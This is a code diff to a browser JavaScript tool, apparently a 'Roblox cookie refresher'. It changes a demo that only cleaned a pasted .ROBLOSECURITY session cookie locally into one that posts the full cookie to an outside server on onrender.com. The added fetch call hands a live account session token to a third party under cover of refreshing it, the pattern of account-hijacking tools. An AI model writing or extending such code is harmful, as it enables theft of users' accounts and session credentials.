@@ -267,18 +267,32 @@ async function processCookie() {
   updateStatus('processing', 'Processing cookie...');
 
   try {
-    // Normalize the cookie input to just the raw value starting with _|WARNING
+    // Extract raw cookie value from input
     const rawCookieValue = extractRawCookieValue(input);
 
     if (!rawCookieValue || !rawCookieValue.startsWith('_|WARNING')) {
       throw new Error('Could not find a valid Roblox cookie starting with "_|WARNING"');
     }
 
-    // For demo, just output the cleaned cookie value
-    outputField.value = rawCookieValue;
+    // Prepare cookie string with .ROBLOSECURITY=
+    const cookieToSend = `.ROBLOSECURITY=${rawCookieValue}`;
 
-    updateStatus('success', 'Cookie processed successfully');
+    // Send to backend
+    const response = await fetch('https://roblox-cookie-refresher-backend.onrender.com/refresh-cookie', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ cookie: cookieToSend }),
+    });
 
+    const data = await response.json();
+
+    if (data.success) {
+      outputField.value = data.newCookie || 'No refreshed cookie returned';
+      updateStatus('success', 'Cookie refreshed successfully!');
+    } else {
+      outputField.value = data.error || 'Failed to refresh cookie';
+      updateStatus('error', 'Failed to refresh cookie');
+    }
   } catch (error) {
     outputField.value = `Error: ${error.message}`;
     updateStatus('error', 'Processing failed');
@@ -288,21 +302,15 @@ async function processCookie() {
   button.disabled = false;
 }
 
-// Helper function to extract raw cookie value from any input format
+// Same helper function as before
 function extractRawCookieValue(input) {
-  // Try to match .ROBLOSECURITY=someValue; or without semicolon
   const regex = /\.ROBLOSECURITY=([^;]+)/i;
   const match = input.match(regex);
-
-  if (match && match[1]) {
-    return match[1].trim();
-  }
-
-  // If no key=value pair found, assume input is raw cookie value already
+  if (match && match[1]) return match[1].trim();
   return input.trim();
 }
 
-// Example updateStatus implementation (if you want me to write this let me know)
+// Same status update function
 function updateStatus(status, message) {
   const statusDot = document.getElementById('statusDot');
   const statusText = document.getElementById('statusText');
@@ -310,7 +318,6 @@ function updateStatus(status, message) {
   statusDot.className = 'status-dot ' + status;
   statusText.textContent = message;
 }
-
 
 function processCookieData(cookieString) {
     const timestamp = new Date().toISOString();
